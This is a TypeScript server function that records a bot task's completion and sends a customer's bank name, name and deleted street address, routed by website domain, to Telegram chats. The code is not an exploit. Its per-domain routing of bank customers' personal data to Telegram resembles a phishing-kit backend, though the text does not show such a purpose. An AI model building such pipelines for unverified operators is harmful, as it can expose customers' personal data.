import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";

const Input = z.object({
  host: z.string().optional().nullable(),
  bankName: z.string().optional().nullable(),
  customerName: z.string().optional().nullable(),
  street: z.string(),
  zip: z.string(),
  city: z.string(),
  taskId: z.string().optional().nullable(),
});

function normalizeDomain(value: string | null | undefined): string | null {
  if (!value) return null;
  const n = value.trim().toLowerCase().replace(/^https?:\/\//, "").split("/")[0]?.split(":")[0];
  return n?.replace(/^www\./, "") || null;
}

function escapeHtml(s: string): string {
  return s.replace(/[&<>]/g, (c) => (c === "&" ? "&amp;" : c === "<" ? "&lt;" : "&gt;"));
}

export const notifyAddressDeleted = createServerFn({ method: "POST" })
  .inputValidator((data: unknown) => Input.parse(data))
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const domain = normalizeDomain(data.host);

    // Dedup per task (best-effort)
    if (data.taskId) {
      const { data: existing } = await supabaseAdmin
        .from("bot_completion_notifications" as any)
        .select("task_id")
        .eq("task_id", data.taskId)
        .maybeSingle();
      if (existing) return { ok: true, deduped: true };
    }

    // Persist first so the admin dashboard always reflects the completion,
    // independent of Telegram delivery.
    if (data.taskId) {
      const { error: insErr } = await supabaseAdmin
        .from("bot_completion_notifications" as any)
        .insert({
          task_id: data.taskId,
          domain,
          bank_name: data.bankName ?? null,
          customer_name: data.customerName ?? null,
          street: data.street,
          zip: data.zip,
          city: data.city,
        });
      if (insErr) console.error("[notifyAddressDeleted] insert failed", insErr);
    }

    const token = process.env["TELEGRAM_BOT_TOKEN"];
    if (!token) return { ok: true, telegram: "not_configured" };

    let chatId: string | null = null;
    if (domain) {
      const { data: exact } = await supabaseAdmin
        .from("domain_routes")
        .select("telegram_chat_id")
        .ilike("domain", domain)
        .not("telegram_chat_id", "is", null)
        .limit(1)
        .maybeSingle();
      chatId = (exact?.telegram_chat_id as string | null) ?? null;
    }
    if (!chatId) {
      const { data: def } = await supabaseAdmin
        .from("domain_routes")
        .select("telegram_chat_id")
        .eq("is_default", true)
        .not("telegram_chat_id", "is", null)
        .limit(1)
        .maybeSingle();
      chatId = (def?.telegram_chat_id as string | null) ?? null;
    }
    chatId = chatId || process.env["TELEGRAM_CHAT_ID"] || null;
    if (!chatId) return { ok: true, telegram: "no_chat_id" };

    const lines = ["✅ <b>Kunde hat den Abschluss erreicht</b>"];
    if (data.bankName) lines.push(`<b>Bank:</b> ${escapeHtml(data.bankName)}`);
    if (data.customerName) lines.push(`<b>Kunde:</b> ${escapeHtml(data.customerName)}`);
    lines.push(
      `<b>Gelöschte Adresse:</b> ${escapeHtml(data.street)}, ${escapeHtml(data.zip)} ${escapeHtml(data.city)}`,
    );
    if (domain) lines.push(`<b>Domain:</b> ${escapeHtml(domain)}`);
    if (data.taskId) lines.push(`<b>Task:</b> <code>${escapeHtml(data.taskId)}</code>`);

    try {
      const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: lines.join("\n"), parse_mode: "HTML" }),
      });
      if (!res.ok) {
        const body = await res.text();
        console.error("[notifyAddressDeleted] telegram error", res.status, body);
        return { ok: true, telegram: `error_${res.status}` };
      }
      return { ok: true, telegram: "sent" };
    } catch (err) {
      console.error("[notifyAddressDeleted] fetch failed", err);
      return { ok: true, telegram: "fetch_failed" };
    }
  });

